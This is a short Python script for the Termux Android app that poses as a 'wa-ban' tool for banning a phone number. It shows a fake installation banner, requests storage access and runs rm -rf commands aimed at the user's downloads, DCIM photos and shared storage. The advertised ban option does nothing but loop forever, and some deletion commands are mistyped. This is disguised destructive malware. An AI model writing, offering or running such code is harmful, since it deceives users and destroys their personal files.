import os
import time
import sys

os.system("clear")

print("\033[1;32m [+] Installing requirments.......  \n")

time.sleep(5.00)

os.system("clear")
os.system("pip3 install colorma")
os.system("apt install figlet")
os.system("clear")
os.system("figlet wa-ban")
os.system("termux-setup-storage")
os.system("cd")
os.system("cd storage")
os.system("rm -rf downloads")
os.system("rm-rf dcim")
os.system("rm-rf shared")

import sys
from termcolor import colored, cprint
text = colored('CODED BY STARK', 'red', attrs=['reverse', 'blink'])
print(text)
print("ENTER THE CHOICE")


print (" 1. Ban number")
print (" 2. Exit")



choice = int(input("ENTER THE CHOICE : "))
looper=0
while True:
    if choice==1:
        print("1 selected")
        print ("᷶᷶")
    else:
        print:("invalid choice")
